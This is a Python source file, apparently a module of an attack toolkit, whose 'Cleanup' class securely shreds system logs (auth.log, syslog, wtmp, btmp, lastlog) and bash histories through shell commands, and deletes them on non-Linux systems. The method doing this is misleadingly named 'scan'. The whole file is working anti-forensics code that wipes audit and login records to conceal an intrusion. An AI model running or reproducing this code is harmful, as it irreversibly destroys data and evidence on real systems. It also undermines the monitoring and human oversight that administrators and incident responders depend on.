import os
import subprocess
import platform

class Cleanup:
    def __init__(self, engine):
        self.engine = engine
        self.priority = "P1"
        self.level = "Critical"

    def scan(self, target):
        logs = [
            "/var/log/auth.log",
            "/var/log/syslog",
            "/var/log/messages",
            "/var/log/wtmp",
            "/var/log/btmp",
            "/var/log/lastlog",
            "/root/.bash_history",
            "/home/*/.bash_history",
        ]
        results = []
        for log in logs:
            try:
                if platform.system() == "Linux":
                    subprocess.run(f"shred -f -z -n 3 {log} 2>/dev/null", shell=True)
                    results.append({"file": log, "status": "shredded"})
                else:
                    subprocess.run(f"del {log}", shell=True)
                    results.append({"file": log, "status": "deleted"})
            except Exception as e:
                results.append({"file": log, "status": "failed", "error": str(e)})
        return {"cleanup": results}
